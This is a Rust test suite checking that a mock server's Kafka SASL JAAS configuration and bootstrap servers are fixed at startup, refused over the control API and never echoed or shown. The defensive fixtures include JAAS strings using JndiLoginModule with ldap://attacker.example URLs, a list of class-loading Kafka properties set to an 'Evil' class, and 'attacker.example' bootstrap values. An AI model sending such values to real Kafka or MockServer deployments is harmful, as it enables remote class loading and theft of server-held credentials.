//! `AsyncApiControlPlaneKafkaStartupOnlyTest` (mockserver-async) and `AsyncKafkaSaslJaasConfigStartupOnlyTest`
//! (mockserver-core), both 9.2.0 (upstream #119): a Kafka JAAS configuration is startup-only. `PUT
//! /mockserver/asyncapi` refuses a `kafkaSecurity.saslJaasConfig` and every field outside the known `kafkaSecurity`
//! ones, a `SASL_*` request takes the startup `asyncKafkaSaslJaasConfig` and may only use the startup
//! `asyncKafkaBootstrapServers`, and `PUT /mockserver/configuration` changes neither (an init-only WARN instead) while
//! `GET /mockserver/configuration` never shows the JAAS configuration.
//!
//! Upstream's control plane holds a `Configuration` instance its tests change between calls; here the startup
//! properties of a `Config` stand in for it (`config(…)`), since the property is startup-only either way.

use mock_server::Config;
use mock_server::asyncapi::BrokerConfig;
use mock_server::asyncapi::kafka::{ClientProperties, apply_security};
use serde_json::{Value, json};

use crate::common::{self, send};

const STARTUP_JAAS: &str = r#"org.apache.kafka.common.security.plain.PlainLoginModule required username="alice" password="alice-secret";"#;
const JNDI_JAAS: &str =
    r#"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker.example/o=x" group.provider.url="ldap://attacker.example/o=x";"#;
const SPEC: &str = r#"{"asyncapi":"2.6.0","info":{"title":"t","version":"1"},"channels":{"orders":{"publish":{"message":{"payload":{"type":"string"}}}}}}"#;

/// The control plane's configuration: `asyncKafkaBootstrapServers` `broker:9093` unless given, and the given startup
/// properties.
fn config(properties: &[(&str, &str)]) -> Config {
    let base = Config::for_tests().with_property("asyncKafkaBootstrapServers", "broker:9093");
    properties.iter().fold(base, |c, (k, v)| c.with_property(k, v))
}

fn kafka_security(field: &str, value: &str) -> Value {
    let mut security = json!({"securityProtocol": "SASL_PLAINTEXT", "saslMechanism": "PLAIN"});
    security[field] = json!(value);
    json!({"kafkaBootstrapServers": "broker:9093", "kafkaSecurity": security})
}

fn refusal(node: &Value, config: &Config) -> String {
    match BrokerConfig::parse(Some(node), config) {
        Err(message) => message,
        Ok(_) => panic!("expected the control plane to refuse {node}"),
    }
}

fn load_body(broker_config: &Value) -> String {
    json!({"spec": SPEC, "brokerConfig": broker_config}).to_string()
}

#[test]
fn should_refuse_a_sasl_jaas_config_sent_over_the_control_plane() {
    let refused = refusal(&kafka_security("saslJaasConfig", JNDI_JAAS), &config(&[]));
    assert!(refused.contains("'kafkaSecurity.saslJaasConfig' cannot be set over the control plane"), "{refused}");
    assert!(refused.contains("must be set at startup"));
    assert!(refused.contains("mockserver.asyncKafkaSaslJaasConfig"));
    assert!(!refused.contains("JndiLoginModule"), "the refusal must not echo the JAAS configuration back");
}

#[test]
fn should_refuse_a_sasl_jaas_config_even_when_a_startup_one_is_configured() {
    let config = config(&[("asyncKafkaSaslJaasConfig", STARTUP_JAAS)]);
    assert!(refusal(&kafka_security("saslJaasConfig", STARTUP_JAAS), &config).contains("must be set at startup"));
}

#[test]
fn should_refuse_a_jaas_configuration_placed_directly_in_broker_config() {
    for field in ["saslJaasConfig", "sasl.jaas.config", "kafkaSaslJaasConfig"] {
        let node = json!({"kafkaBootstrapServers": "broker:9093", field: JNDI_JAAS});
        assert!(refusal(&node, &config(&[])).contains("must be set at startup"), "{field}");
    }
}

#[test]
fn should_refuse_every_class_loading_kafka_property_as_an_unknown_field() {
    let mut accepted = Vec::new();
    for field in [
        "sasl.jaas.config", "saslLoginClass", "sasl.login.class", "saslClientCallbackHandlerClass", "sasl.client.callback.handler.class",
        "saslLoginCallbackHandlerClass", "sasl.login.callback.handler.class", "interceptorClasses", "interceptor.classes", "securityProviders",
        "security.providers", "configProviders", "config.providers", "keySerializer", "value.serializer", "key.deserializer", "valueDeserializer",
        "sslEngineFactoryClass", "ssl.engine.factory.class", "metricReporters", "partitionerClass", "saslJaasConfigFile",
    ] {
        match BrokerConfig::parse(Some(&kafka_security(field, "org.example.Evil")), &config(&[])) {
            Ok(_) => accepted.push(field),
            Err(refused) => {
                assert!(refused.contains(&format!("'{field}'")), "{refused}");
                assert!(refused.contains("cannot be set over the control plane"), "{refused}");
            }
        }
    }
    assert!(accepted.is_empty(), "kafkaSecurity fields accepted rather than refused: {accepted:?}");
}

#[tokio::test(flavor = "multi_thread")]
async fn should_refuse_a_sasl_jaas_config_on_load_so_no_broker_connection_is_made() {
    let r = common::start(&[("asyncKafkaBootstrapServers", "broker:9093")]).await;
    let load = send(r.port, "PUT", "/mockserver/asyncapi", &load_body(&kafka_security("saslJaasConfig", JNDI_JAAS))).await;
    assert_eq!(load.status, 400, "load must refuse the request with a client error (400): {}", load.body);
    assert!(load.body.contains("must be set at startup"), "{}", load.body);
    let status: Value = serde_json::from_str(&send(r.port, "GET", "/mockserver/asyncapi", "").await.body).unwrap();
    assert_eq!(status["publishers"], 0);
}

#[test]
fn should_treat_a_json_null_sasl_jaas_config_as_absent() {
    let mut node = kafka_security("saslMechanism", "PLAIN");
    node["kafkaSecurity"]["saslJaasConfig"] = Value::Null;
    let parsed = BrokerConfig::parse(Some(&node), &config(&[])).unwrap();
    assert_eq!(parsed.kafka_security.unwrap().sasl_jaas_config, None);
}

#[test]
fn should_give_the_kafka_client_the_startup_jaas_config_for_a_sasl_protocol() {
    let config = config(&[("asyncKafkaSaslJaasConfig", STARTUP_JAAS)]);
    let parsed = BrokerConfig::parse(Some(&kafka_security("saslMechanism", "PLAIN")), &config).unwrap();
    let mut props = ClientProperties::default();
    apply_security(&mut props, parsed.kafka_security.as_ref());
    assert_eq!(props.get("security.protocol"), Some("SASL_PLAINTEXT"));
    assert_eq!(props.get("sasl.mechanism"), Some("PLAIN"));
    assert_eq!(props.get("sasl.jaas.config"), Some(STARTUP_JAAS));
}

#[tokio::test(flavor = "multi_thread")]
async fn should_refuse_a_sasl_request_naming_a_different_bootstrap_so_the_startup_jaas_is_never_sent_there() {
    let properties = [("asyncKafkaSaslJaasConfig", STARTUP_JAAS), ("asyncKafkaBootstrapServers", "broker:9092")];
    let config = config(&properties);
    let mut node = kafka_security("saslMechanism", "PLAIN");
    node["kafkaBootstrapServers"] = json!("attacker.example:9092,broker:9092");
    let refused = refusal(&node, &config);
    assert!(refused.contains("'kafkaBootstrapServers' must be omitted or match the startup mockserver.asyncKafkaBootstrapServers"), "{refused}");
    assert!(!refused.contains("alice-secret"), "the refusal must not echo the JAAS configuration");
    let r = common::start(&properties).await;
    let load = send(r.port, "PUT", "/mockserver/asyncapi", &load_body(&node)).await;
    assert_eq!(load.status, 400, "load must refuse the request with a client error (400): {}", load.body);
    let status: Value = serde_json::from_str(&send(r.port, "GET", "/mockserver/asyncapi", "").await.body).unwrap();
    assert_eq!(status["publishers"], 0);
}

#[test]
fn should_refuse_every_sasl_request_when_no_startup_bootstrap_is_set() {
    let without = config(&[("asyncKafkaBootstrapServers", "")]);
    let named = kafka_security("saslMechanism", "PLAIN");
    let mut omitted = named.clone();
    omitted.as_object_mut().unwrap().remove("kafkaBootstrapServers");
    for node in [&named, &omitted] {
        assert!(refusal(node, &without).contains("a SASL securityProtocol needs mockserver.asyncKafkaBootstrapServers"));
    }
    let with_jaas = config(&[("asyncKafkaBootstrapServers", ""), ("asyncKafkaSaslJaasConfig", STARTUP_JAAS)]);
    assert!(refusal(&omitted, &with_jaas).contains("to be set before the server starts"));
}

#[test]
fn should_give_the_startup_jaas_when_the_request_omits_or_repeats_the_startup_bootstrap() {
    let config = config(&[("asyncKafkaSaslJaasConfig", STARTUP_JAAS), ("asyncKafkaBootstrapServers", "broker:9092, other:9093")]);
    let mut repeated = kafka_security("saslMechanism", "PLAIN");
    repeated["kafkaBootstrapServers"] = json!(" OTHER:9093,broker:9092 ");
    let named = BrokerConfig::parse(Some(&repeated), &config).unwrap();
    assert_eq!(named.kafka_security.unwrap().sasl_jaas_config.as_deref(), Some(STARTUP_JAAS));
    let mut omitted = kafka_security("saslMechanism", "PLAIN");
    omitted.as_object_mut().unwrap().remove("kafkaBootstrapServers");
    let defaulted = BrokerConfig::parse(Some(&omitted), &config).unwrap();
    assert_eq!(defaulted.kafka_security.unwrap().sasl_jaas_config.as_deref(), Some(STARTUP_JAAS));
    assert_eq!(defaulted.kafka_bootstrap_servers.as_deref(), Some("broker:9092, other:9093"));
}

#[test]
fn should_bind_the_bootstrap_for_a_sasl_request_even_without_a_startup_jaas() {
    // with no startup JAAS the Kafka client uses the JVM's JAAS login configuration, also a server-held credential
    let config = config(&[]);
    let mut elsewhere = kafka_security("saslMechanism", "PLAIN");
    elsewhere["kafkaBootstrapServers"] = json!("attacker.example:9092");
    assert!(refusal(&elsewhere, &config).contains("'kafkaBootstrapServers' must be omitted or match"));
    let startup = BrokerConfig::parse(Some(&kafka_security("saslMechanism", "PLAIN")), &config).unwrap();
    assert_eq!(startup.kafka_bootstrap_servers.as_deref(), Some("broker:9093"));
    assert_eq!(startup.kafka_security.unwrap().sasl_jaas_config, None);
    for protocol in ["PLAINTEXT", "SSL"] {
        let not_sasl = json!({"kafkaBootstrapServers": "attacker.example:9092", "kafkaSecurity": {"securityProtocol": protocol}});
        assert_eq!(BrokerConfig::parse(Some(&not_sasl), &config).unwrap().kafka_bootstrap_servers.as_deref(), Some("attacker.example:9092"), "{protocol}");
    }
}

#[test]
fn should_not_give_the_startup_jaas_config_to_a_non_sasl_protocol() {
    let config = config(&[("asyncKafkaSaslJaasConfig", STARTUP_JAAS)]);
    let node = json!({"kafkaBootstrapServers": "broker:9093", "kafkaSecurity": {"securityProtocol": "SSL"}});
    assert_eq!(BrokerConfig::parse(Some(&node), &config).unwrap().kafka_security.unwrap().sasl_jaas_config, None);
    assert!(BrokerConfig::parse(Some(&json!({"kafkaBootstrapServers": "broker:9092"})), &config).unwrap().kafka_security.is_none());
}

#[test]
fn should_refuse_an_unsupported_sasl_mechanism_or_security_protocol() {
    let config = config(&[]);
    assert!(refusal(&kafka_security("saslMechanism", "EVIL"), &config).contains("allowed values are [GSSAPI, PLAIN, SCRAM-SHA-256, SCRAM-SHA-512, OAUTHBEARER]"));
    let bad_protocol = json!({"kafkaSecurity": {"securityProtocol": "SASL_EVIL"}});
    assert!(refusal(&bad_protocol, &config).contains("allowed values are [PLAINTEXT, SSL, SASL_PLAINTEXT, SASL_SSL]"));
}

#[test]
fn should_accept_every_built_in_sasl_mechanism_and_a_lower_case_protocol() {
    for mechanism in ["GSSAPI", "PLAIN", "SCRAM-SHA-256", "SCRAM-SHA-512", "OAUTHBEARER"] {
        let node = json!({"kafkaSecurity": {"securityProtocol": "sasl_ssl", "saslMechanism": mechanism}});
        let security = BrokerConfig::parse(Some(&node), &config(&[])).unwrap().kafka_security.unwrap();
        assert_eq!(security.security_protocol.as_deref(), Some("SASL_SSL"));
        assert_eq!(security.sasl_mechanism.as_deref(), Some(mechanism));
    }
}

// ---- AsyncKafkaSaslJaasConfigStartupOnlyTest ----

const STARTUP_SECRET_JAAS: &str = r#"org.apache.kafka.common.security.plain.PlainLoginModule required username="alice" password="startup-secret";"#;
const PUT_JAAS: &str = r#"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker.example/o=x";"#;

async fn startup_server() -> common::Running {
    common::start(&[("logLevel", "WARN"), ("asyncKafkaSaslJaasConfig", STARTUP_SECRET_JAAS), ("asyncKafkaBootstrapServers", "broker:9092")]).await
}

/// The WARN entries `PUT /mockserver/configuration` with `update` logged.
async fn put_warnings(r: &common::Running, update: &Value) -> Vec<String> {
    assert_eq!(send(r.port, "PUT", "/mockserver/reset", "").await.status, 200);
    let answer = send(r.port, "PUT", "/mockserver/configuration", &update.to_string()).await;
    assert_eq!(answer.status, 200, "{}", answer.body);
    let logs = send(r.port, "PUT", "/mockserver/retrieve?type=LOGS&format=LOG_ENTRIES", "").await.body;
    let logs: Value = serde_json::from_str(&logs).unwrap();
    logs.as_array().unwrap().iter().filter(|e| e["logLevel"] == "WARN").map(|e| e["messageFormat"].as_str().unwrap_or_default().to_string()).collect()
}

/// `asyncKafkaBootstrapServers` as `GET /mockserver/configuration` shows it.
async fn bootstrap_in_force(r: &common::Running) -> Value {
    let body: Value = serde_json::from_str(&send(r.port, "GET", "/mockserver/configuration", "").await.body).unwrap();
    body["asyncKafkaBootstrapServers"].clone()
}

#[tokio::test(flavor = "multi_thread")]
async fn should_ignore_and_warn_without_showing_either_value_when_a_put_supplies_it() {
    let r = startup_server().await;
    let warnings = put_warnings(&r, &json!({"asyncKafkaSaslJaasConfig": PUT_JAAS})).await;
    assert_eq!(warnings.len(), 1, "{warnings:?}");
    assert!(warnings[0].contains("asyncKafkaSaslJaasConfig is fixed at startup"), "{}", warnings[0]);
    assert!(warnings[0].contains("login module class"));
    assert!(!warnings[0].contains("JndiLoginModule"));
    assert!(!warnings[0].contains("startup-secret"));
    // the startup value is still the one in force: echoing it is not warned about
    assert_eq!(put_warnings(&r, &json!({"asyncKafkaSaslJaasConfig": STARTUP_SECRET_JAAS})).await, Vec::<String>::new());
}

#[tokio::test(flavor = "multi_thread")]
async fn should_not_warn_when_a_put_echoes_the_value_in_force() {
    let r = startup_server().await;
    assert_eq!(put_warnings(&r, &json!({"asyncKafkaSaslJaasConfig": STARTUP_SECRET_JAAS})).await, Vec::<String>::new());
}

#[tokio::test(flavor = "multi_thread")]
async fn should_fix_the_bootstrap_servers_at_startup() {
    let r = startup_server().await;
    let warnings = put_warnings(&r, &json!({"asyncKafkaBootstrapServers": "attacker.example:9092"})).await;
    assert_eq!(bootstrap_in_force(&r).await, "broker:9092");
    assert_eq!(warnings.len(), 1, "{warnings:?}");
    assert!(warnings[0].contains("asyncKafkaBootstrapServers is fixed at startup"), "{}", warnings[0]);
    assert!(warnings[0].contains("held by the server"));
    assert!(!warnings[0].contains("startup-secret"));
}

#[tokio::test(flavor = "multi_thread")]
async fn should_fix_the_bootstrap_servers_at_startup_even_without_a_jaas() {
    // a SASL request can still use the JVM's own JAAS login configuration, which is also held by the server
    let r = common::start(&[("asyncKafkaBootstrapServers", "broker:9092")]).await;
    assert_eq!(send(r.port, "PUT", "/mockserver/configuration", r#"{"asyncKafkaBootstrapServers":"other:9092"}"#).await.status, 200);
    assert_eq!(bootstrap_in_force(&r).await, "broker:9092");
}

#[tokio::test(flavor = "multi_thread")]
async fn should_not_warn_when_a_put_echoes_the_bootstrap_servers_in_force() {
    let r = startup_server().await;
    assert_eq!(put_warnings(&r, &json!({"asyncKafkaBootstrapServers": "broker:9092"})).await, Vec::<String>::new());
}

#[tokio::test(flavor = "multi_thread")]
async fn should_never_return_it_from_get_configuration() {
    let r = startup_server().await;
    let body = send(r.port, "GET", "/mockserver/configuration", "").await.body;
    assert!(!body.contains("asyncKafkaSaslJaasConfig"), "{body}");
    assert!(!body.contains("startup-secret"));
}

#[tokio::test(flavor = "multi_thread")]
async fn should_be_treated_as_sensitive_when_printed() {
    // `isSensitivePropertyName`: the effective configuration (`GET /mockserver/config`) shows it redacted
    let r = startup_server().await;
    let body: Value = serde_json::from_str(&send(r.port, "GET", "/mockserver/config", "").await.body).unwrap();
    let entry = body.as_array().unwrap().iter().find(|e| e["name"] == "mockserver.asyncKafkaSaslJaasConfig").expect("listed").clone();
    assert_eq!(entry["value"], "***REDACTED***", "{entry}");
}

// `shouldBuildAStartupConfigurationCarryingIt` (a `ConfigurationDTO` built into a startup `Configuration`): the
// startup configuration here is the `Config` itself, whose startup property every test above reads.
